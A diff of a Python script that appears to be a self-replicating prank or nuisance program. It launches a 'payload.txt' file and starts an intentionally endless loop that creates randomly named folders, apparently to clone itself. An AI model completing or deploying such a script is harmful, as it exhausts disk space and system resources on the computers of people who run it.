@@ -17,18 +17,20 @@ import time
 #allows pseudo random integers and floats
 import random
 
+#script accesses the Argv librabry as a variable.
 script = argv
 #access the last input in the command console, that is needed to clone the files
 name = str(script[0])
-
 #starts the payload text file, stored as a variable
 cmd = 'start payload.txt'
 #enters the variable into the CMD command
 os.system(cmd)
-
+# this is a variable that is allways true so the loop can run indefinately.
 x = 1
+
+#Using the variable x this loop will run forever sine there are no breaks in it and the variable x is never changed. This is intentional.
 while x==1:
-#Hexadecimal color code creator to make sure no folders have the same name. 
+	#Hexadecimal color code creator to make sure no folders have the same name. 
 	#This Hexadecimal code is then used as a folder name and a new one is generated each loop.
 	def gen_hex_colour_code():
 		return ''.join([random.choice('0123456789ABCDEF') for x in range(6)])
